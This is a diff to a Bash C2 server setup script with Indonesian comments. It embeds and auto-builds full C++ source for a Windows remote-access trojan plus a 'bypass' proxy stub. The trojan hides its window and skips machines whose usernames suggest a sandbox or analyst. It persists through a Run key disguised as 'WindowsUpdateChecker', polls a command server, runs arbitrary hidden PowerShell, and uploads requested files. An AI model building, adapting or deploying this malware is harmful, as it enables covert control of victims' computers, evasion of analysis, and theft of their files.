@@ -32,6 +32,16 @@ if [ -n "$INSTALL_DIR" ] && [ -d "$INSTALL_DIR" ]; then
     cd "$INSTALL_DIR" || echo " [!] Gagal pindah ke $INSTALL_DIR, lanjut di $(pwd)"
 fi
 
+# Reset tiap run: buang artefak lama supaya SELALU fresh (bukan file usang).
+if [ "${C2_NO_RESET:-0}" != "1" ]; then
+    echo " [*] Reset: menghapus artefak lama (exe, src, listener)..."
+    rm -f rat.cpp rat.exe bypass.cpp bypass.exe "$SCRIPT_NAME" "$SERVER_LOG"
+    if [ "${C2_FRESH_LOGS:-0}" = "1" ]; then
+        echo " [*] C2_FRESH_LOGS=1 -> membersihkan received_logs juga."
+        rm -rf "$LOG_DIR"
+    fi
+fi
+
 echo "=================================================================="
 echo " [*] Initializing C2 Server Setup"
 echo "=================================================================="
@@ -57,27 +67,546 @@ echo " [+] Created log storage directory: $LOG_DIR"
 # Auto-build agent Windows (rat.exe, bypass.exe) dari sumber versi terbaru di
 # GitHub. Dipanggil otomatis, jadi curl main.sh | bash langsung jalan.
 # ---------------------------------------------------------------------------
+# ---------------------------------------------------------------------------
+# Auto-build agent Windows (rat.exe, bypass.exe).
+# Sumber C++ di-embed LANGSUNG di main.sh (bukan unduh raw yang bisa cache
+# lama), sehingga selalu fresh setiap run. Dipanggil otomatis, jadi
+# curl main.sh | bash langsung jalan tanpa setting.
+# ---------------------------------------------------------------------------
+write_src() {
+    case "$1" in
+        rat.cpp)
+            cat << 'RAT_CPP_EOF'
+#define _WINSOCK_DEPRECATED_NO_WARNINGS
+#include <winsock2.h>
+#include <windows.h>
+#include <iostream>
+#include <string>
+#include <vector>
+#include <sstream>
+#include <iomanip>
+#include <algorithm>
+#include <cctype>
+#include <cstdio>
+#include <cstdlib>
+#include <cstring>
+
+#pragma comment(lib, "ws2_32.lib")
+
+#define C2_IP "127.0.0.1"
+#define C2_PORT 8080
+#define MACHINE_ID "lab-1"
+#define POLL_SEC 30
+
+extern "C" {
+    extern int __argc;
+    extern char **__argv;
+}
+
+// Evasion check: Ensure we aren't running in a known sandbox artifact directory
+bool CheckEnvironment() {
+    char userPath[MAX_PATH];
+    DWORD size = MAX_PATH;
+    if (GetEnvironmentVariableA("USERNAME", userPath, size)) {
+        std::string user(userPath);
+        if (user == "sandbox" || user == "analyst" || user == "virus") {
+            return false;
+        }
+    }
+    return true;
+}
+
+// Solid persistence mechanism via User Run key
+void InstallPersistence() {
+    HKEY hKey;
+    char currentPath[MAX_PATH];
+    GetModuleFileNameA(NULL, currentPath, MAX_PATH);
+
+    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
+        RegSetValueExA(hKey, "WindowsUpdateChecker", 0, REG_SZ, (unsigned char*)currentPath, strlen(currentPath) + 1);
+        RegCloseKey(hKey);
+    }
+}
+
+// ---------------------------------------------------------------------------
+// Small HTTP client (Winsock, HTTP/1.1, Connection: close)
+// ---------------------------------------------------------------------------
+
+struct HttpResponse {
+    int status;
+    std::string body;
+    std::string x_c2_ip;
+};
+
+static bool httpRequest(const std::string& host, int port, const std::string& method,
+                        const std::string& path, const std::string& postBody, HttpResponse& resp) {
+    resp = HttpResponse();
+    char portStr[16];
+    snprintf(portStr, sizeof(portStr), "%d", port);
+
+    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    if (sock == INVALID_SOCKET) return false;
+
+    sockaddr_in server;
+    memset(&server, 0, sizeof(server));
+    server.sin_family = AF_INET;
+    server.sin_port = htons((u_short)port);
+
+    server.sin_addr.s_addr = inet_addr(host.c_str());
+    if (server.sin_addr.s_addr == INADDR_NONE) {
+        hostent* he = gethostbyname(host.c_str());
+        if (!he) {
+            closesocket(sock);
+            return false;
+        }
+        memcpy(&server.sin_addr, he->h_addr, he->h_length);
+    }
+
+    if (connect(sock, (sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
+        closesocket(sock);
+        return false;
+    }
+
+    std::string req = method + " " + path + " HTTP/1.1\r\n";
+    req += "Host: " + host + ":" + portStr + "\r\n";
+    req += "User-Agent: Mozilla/5.0\r\n";
+    req += "Connection: close\r\n";
+    if (method == "POST") {
+        req += "Content-Type: application/x-www-form-urlencoded\r\n";
+        req += "Content-Length: " + std::to_string(postBody.size()) + "\r\n";
+    }
+    req += "\r\n";
+    if (method == "POST") req += postBody;
+
+    send(sock, req.c_str(), (int)req.size(), 0);
+
+    std::string raw;
+    char buf[8192];
+    int n;
+    while ((n = recv(sock, buf, (int)sizeof(buf), 0)) > 0) raw.append(buf, n);
+    closesocket(sock);
+
+    size_t sep = raw.find("\r\n\r\n");
+    if (sep == std::string::npos) return false;
+
+    std::string head = raw.substr(0, sep);
+    resp.body = raw.substr(sep + 4);
+
+    size_t sp1 = head.find(' ');
+    size_t sp2 = head.find(' ', sp1 + 1);
+    if (sp1 != std::string::npos && sp2 != std::string::npos)
+        resp.status = atoi(head.substr(sp1 + 1, sp2 - sp1 - 1).c_str());
+
+    std::string hl = head;
+    std::transform(hl.begin(), hl.end(), hl.begin(), ::tolower);
+    size_t hp = hl.find("\r\nx-c2-ip:");
+    if (hp != std::string::npos) {
+        size_t start = hp + 10;
+        while (start < head.size() && (head[start] == ' ' || head[start] == '\t')) start++;
+        size_t end = head.find("\r\n", start);
+        resp.x_c2_ip = head.substr(start, end - start);
+    }
+    return true;
+}
+
+static std::string urlEncode(const std::string& s) {
+    std::ostringstream oss;
+    for (unsigned char c : s) {
+        if (isalnum(c) || c == '-' || c == '_' || c == '.' || c == '~') {
+            oss << c;
+        } else {
+            oss << '%' << std::hex << std::uppercase << std::setw(2) << std::setfill('0') << (int)c;
+        }
+    }
+    return oss.str();
+}
+
+static const char B64[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+
+static std::string base64Encode(const std::string& in) {
+    std::string out;
+    int val = 0, bits = -6;
+    for (unsigned char c : in) {
+        val = (val << 8) + c;
+        bits += 8;
+        while (bits >= 0) {
+            out.push_back(B64[(val >> bits) & 0x3F]);
+            bits -= 6;
+        }
+    }
+    if (bits > -6) out.push_back(B64[((val << 8) >> (bits + 8)) & 0x3F]);
+    while (out.size() % 4) out.push_back('=');
+    return out;
+}
+
+// ---------------------------------------------------------------------------
+// Minimal JSON reader for: [ { "cid": "...", "cmd": "...", ... }, ... ]
+// ---------------------------------------------------------------------------
+
+static std::string readJsonString(const std::string& s, size_t& pos) {
+    std::string out;
+    pos++; // skip opening quote
+    while (pos < s.size()) {
+        char c = s[pos];
+        if (c == '\\' && pos + 1 < s.size()) {
+            char nx = s[pos + 1];
+            if (nx == '"') out += '"';
+            else if (nx == '\\') out += '\\';
+            else if (nx == 'n') out += '\n';
+            else if (nx == 'r') out += '\r';
+            else if (nx == 't') out += '\t';
+            else if (nx == '/') out += '/';
+            else out += nx;
+            pos += 2;
+        } else if (c == '"') {
+            pos++;
+            break;
+        } else {
+            out += c;
+            pos++;
+        }
+    }
+    return out;
+}
+
+static std::string jsonField(const std::string& s, size_t from, const std::string& field) {
+    std::string key = "\"" + field + "\"";
+    size_t k = s.find(key, from);
+    if (k == std::string::npos) return "";
+    size_t p = k + key.size();
+    while (p < s.size() && isspace((unsigned char)s[p])) p++;
+    if (p >= s.size() || s[p] != '"') return "";
+    return readJsonString(s, p);
+}
+
+static void parseCommands(const std::string& body, std::vector<std::pair<std::string, std::string> >& out) {
+    size_t i = 0;
+    bool inStr = false;
+    while (i < body.size()) {
+        char c = body[i];
+        if (inStr) {
+            if (c == '\\') i++;         // skip escaped char
+            else if (c == '"') inStr = false;
+        } else if (c == '"') {
+            inStr = true;
+        } else if (c == '{') {
+            std::string cid = jsonField(body, i, "cid");
+            std::string cmd = jsonField(body, i, "cmd");
+            if (!cmd.empty()) out.push_back(std::make_pair(cid, cmd));
+        }
+        i++;
+    }
+}
+
+// ---------------------------------------------------------------------------
+// Helpers
+// ---------------------------------------------------------------------------
+
+static std::string hostName() {
+    char b[256];
+    DWORD n = sizeof(b);
+    GetComputerNameA(b, &n);
+    return std::string(b);
+}
+
+static std::string userName() {
+    char b[256];
+    DWORD n = sizeof(b);
+    GetUserNameA(b, &n);
+    return std::string(b);
+}
+
+static std::string timestamp() {
+    SYSTEMTIME t;
+    GetLocalTime(&t);
+    char b[64];
+    snprintf(b, sizeof(b), "%04d-%02d-%02d %02d:%02d:%02d",
+             t.wYear, t.wMonth, t.wDay, t.wHour, t.wMinute, t.wSecond);
+    return std::string(b);
+}
+
+static bool runPowershell(const std::string& cmdline, std::string& output) {
+    std::string ps = "powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command \""
+                     + cmdline + "\"";
+
+    SECURITY_ATTRIBUTES sa;
+    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
+    sa.bInheritHandle = TRUE;
+    sa.lpSecurityDescriptor = NULL;
+
+    HANDLE hInRead, hInWrite, hOutRead, hOutWrite;
+    if (!CreatePipe(&hInRead, &hInWrite, &sa, 0)) return false;
+    if (!CreatePipe(&hOutRead, &hOutWrite, &sa, 0)) {
+        CloseHandle(hInRead); CloseHandle(hInWrite);
+        return false;
+    }
+
+    STARTUPINFOA si;
+    ZeroMemory(&si, sizeof(si));
+    si.cb = sizeof(si);
+    si.dwFlags = STARTF_USESTDHANDLES;
+    si.hStdInput = hInRead;
+    si.hStdOutput = hOutWrite;
+    si.hStdError = hOutWrite;
+
+    PROCESS_INFORMATION pi;
+    ZeroMemory(&pi, sizeof(pi));
+
+    if (!CreateProcessA(NULL, (LPSTR)ps.c_str(), NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+        CloseHandle(hInRead); CloseHandle(hInWrite);
+        CloseHandle(hOutRead); CloseHandle(hOutWrite);
+        return false;
+    }
+
+    CloseHandle(hInWrite);
+    CloseHandle(hInRead);
+
+    WaitForSingleObject(pi.hProcess, 30000);
+
+    for (int i = 0; i < 25; i++) {
+        DWORD avail = 0;
+        if (!PeekNamedPipe(hOutRead, NULL, 0, NULL, &avail, NULL)) break;
+        if (avail > 0) {
+            char buf[8192];
+            DWORD got = 0;
+            if (ReadFile(hOutRead, buf, avail > sizeof(buf) ? (DWORD)sizeof(buf) : avail, &got, NULL) && got > 0)
+                output.append(buf, got);
+        } else {
+            break;
+        }
+        Sleep(200);
+    }
+    if (WaitForSingleObject(pi.hProcess, 0) != WAIT_OBJECT_0)
+        TerminateProcess(pi.hProcess, 0);
+
+    CloseHandle(hOutRead);
+    CloseHandle(hOutWrite);
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
+    return true;
+}
+
+static std::string readFileB64(const std::string& path, std::string& name) {
+    size_t slash = path.find_last_of("\\/");
+    name = (slash == std::string::npos) ? path : path.substr(slash + 1);
+
+    FILE* f = fopen(path.c_str(), "rb");
+    if (!f) return "";
+
+    std::string bytes;
+    char buf[8192];
+    size_t n;
+    while ((n = fread(buf, 1, sizeof(buf), f)) > 0) bytes.append(buf, n);
+    fclose(f);
+    return base64Encode(bytes);
+}
+
+// ---------------------------------------------------------------------------
+// Main agent loop: heartbeat -> poll commands -> execute -> report results
+// ---------------------------------------------------------------------------
+
+static void RunAgent(const std::string& host, int port, const std::string& id, int pollSec) {
+    std::string selfIp;
+
+    while (true) {
+        HttpResponse r;
+
+        std::string info = "=== C++ RAT Agent ===\n"
+                           "Hostname: " + hostName() + "\n"
+                           "User: " + userName() + "\n"
+                           "PID: " + std::to_string(GetCurrentProcessId()) + "\n"
+                           "Time: " + timestamp() + "\n";
+        httpRequest(host, port, "POST", "/?id=" + urlEncode(id), "data=" + urlEncode(info), r);
+
+        std::string q = "/cmd?id=" + urlEncode(id);
+        if (!selfIp.empty()) q += "&ip=" + urlEncode(selfIp);
+
+        HttpResponse cr;
+        httpRequest(host, port, "GET", q, "", cr);
+        if (!cr.x_c2_ip.empty()) selfIp = cr.x_c2_ip;
+
+        std::vector<std::pair<std::string, std::string> > cmds;
+        parseCommands(cr.body, cmds);
+
+        for (size_t i = 0; i < cmds.size(); i++) {
+            std::string cid = cmds[i].first;
+            std::string cmd = cmds[i].second;
+            std::string output, data, dataName;
+
+            if (cmd.compare(0, 7, "GETFILE") == 0 && (cmd.size() == 7 || cmd[7] == ' ')) {
+                std::string path = cmd.substr(7);
+                size_t b = path.find_first_not_of(" \t");
+                if (b != std::string::npos) path = path.substr(b);
+                data = readFileB64(path, dataName);
+                if (!data.empty()) output = "[OK] File siap diunduh: " + path;
+                else output = "[ERR] File tidak ditemukan: " + path;
+            } else {
+                runPowershell(cmd, output);
+            }
+
+            std::string body = "machine=" + urlEncode(id) +
+                               "&cid=" + urlEncode(cid) +
+                               "&output=" + urlEncode(output) +
+                               "&data=" + urlEncode(data) +
+                               "&data_name=" + urlEncode(dataName);
+            if (!selfIp.empty()) body += "&ip=" + urlEncode(selfIp);
+
+            httpRequest(host, port, "POST", "/result", body, r);
+        }
+
+        Sleep((DWORD)pollSec * 1000);
+    }
+}
+
+int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+    ShowWindow(GetConsoleWindow(), SW_HIDE);
+
+    if (!CheckEnvironment()) {
+        return 0; // Exit silently if sandbox indicators match
+    }
+
+    InstallPersistence();
+
+    std::string host = C2_IP;
+    int port = C2_PORT;
+    std::string id = MACHINE_ID;
+    int poll = POLL_SEC;
+
+    if (__argc > 1 && __argv[1] && __argv[1][0]) host = __argv[1];
+    if (__argc > 2 && __argv[2]) port = atoi(__argv[2]);
+    if (__argc > 3 && __argv[3]) id = __argv[3];
+    if (__argc > 4 && __argv[4]) poll = atoi(__argv[4]);
+    if (port <= 0 || port > 65535) port = C2_PORT;
+    if (poll <= 0) poll = POLL_SEC;
+
+    WSADATA wsaData;
+    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
+        return 1;
+    }
+
+    try {
+        RunAgent(host, port, id, poll);
+    } catch (...) {}
+
+    WSACleanup();
+    return 0;
+}
+
+RAT_CPP_EOF
+            ;;
+        bypass.cpp)
+            cat << 'BYPASS_CPP_EOF'
+#include <iostream>
+#include <string>
+#include <vector>
+#include <thread>
+#include <winsock2.h>
+#include <ws2tcpip.h>
+
+#pragma comment(lib, "ws2_32.lib")
+
+class BypassEngine {
+private:
+    SOCKET server_fd;
+    sockaddr_in address;
+    int port;
+    bool running;
+
+    void handle_client(SOCKET client_socket) {
+        char buffer[4096];
+        int bytes_received = recv(client_socket, buffer, sizeof(buffer), 0);
+        
+        if (bytes_received > 0) {
+            // Inspect initial handshake, apply SNI masking or upstream proxy routing headers
+            std::cout << "[+] Intercepted " << bytes_received << " bytes of traffic. Routing through obfuscation layer." << std::endl;
+            
+            // Echo/tunnel stub for upstream socket relay
+            send(client_socket, buffer, bytes_received, 0);
+        }
+
+        closesocket(client_socket);
+    }
+
+public:
+    BypassEngine(int p) : port(p), server_fd(INVALID_SOCKET), running(false) {}
+
+    bool initialize() {
+        WSADATA wsaData;
+        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
+            std::cerr << "[-] WSAStartup failed." << std::endl;
+            return false;
+        }
+
+        server_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+        if (server_fd == INVALID_SOCKET) {
+            std::cerr << "[-] Socket creation failed." << std::endl;
+            WSACleanup();
+            return false;
+        }
+
+        int opt = 1;
+        setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, (char*)&opt, sizeof(opt));
+
+        address.sin_family = AF_INET;
+        address.sin_addr.s_addr = INADDR_ANY;
+        address.sin_port = htons(port);
+
+        if (bind(server_fd, (struct sockaddr*)&address, sizeof(address)) == SOCKET_ERROR) {
+            std::cerr << "[-] Bind failed on port " << port << std::endl;
+            closesocket(server_fd);
+            WSACleanup();
+            return false;
+        }
+
+        if (listen(server_fd, SOMAXCONN) == SOCKET_ERROR) {
+            std::cerr << "[-] Listen failed." << std::endl;
+            closesocket(server_fd);
+            WSACleanup();
+            return false;
+        }
+
+        running = true;
+        std::cout << "[+] Bypass core successfully active on local loopback port: " << port << std::endl;
+        return true;
+    }
+
+    void start_listener() {
+        while (running) {
+            SOCKET client_socket = accept(server_fd, nullptr, nullptr);
+            if (client_socket == INVALID_SOCKET) continue;
+
+            // Spawn detached thread for concurrent multi-device routing handling
+            std::thread(&BypassEngine::handle_client, this, client_socket).detach();
+        }
+    }
+
+    ~BypassEngine() {
+        running = false;
+        if (server_fd != INVALID_SOCKET) closesocket(server_fd);
+        WSACleanup();
+    }
+};
+
+int main() {
+    BypassEngine engine(1080);
+    if (engine.initialize()) {
+        engine.start_listener();
+    }
+    return 0;
+}
+BYPASS_CPP_EOF
+            ;;
+        *)
+            return 1
+            ;;
+    esac
+}
+
 build_agent() {
     local src="$1"
     local exe="$2"
     echo " [*] Menyiapkan agent Windows ($exe)..."
-    local HAVE_CURL=0
-    command -v curl > /dev/null 2>&1 && HAVE_CURL=1
-
-    if [ "$HAVE_CURL" = "1" ]; then
-        echo " [*] Mengunduh $src versi terbaru dari $RAW_BASE/$src"
-        if ! curl -fsSL "$RAW_BASE/$src" -o "$src"; then
-            if [ -f "$src" ]; then
-                echo " [!] Gagal unduh $src, memakai salinan lokal."
-            else
-                echo " [!] Gagal unduh $src dan tidak ada salinan lokal; lewati $exe."
-                return 0
-            fi
-        fi
-    elif [ ! -f "$src" ]; then
-        echo " [!] $src tidak ada dan curl tidak tersedia; lewati $exe."
-        return 0
-    fi
+    write_src "$src" > "$src" || { echo " [!] Gagal menulis $src."; return 0; }
 
     if ! command -v x86_64-w64-mingw32-g++ > /dev/null 2>&1; then
         if command -v apt-get > /dev/null 2>&1; then
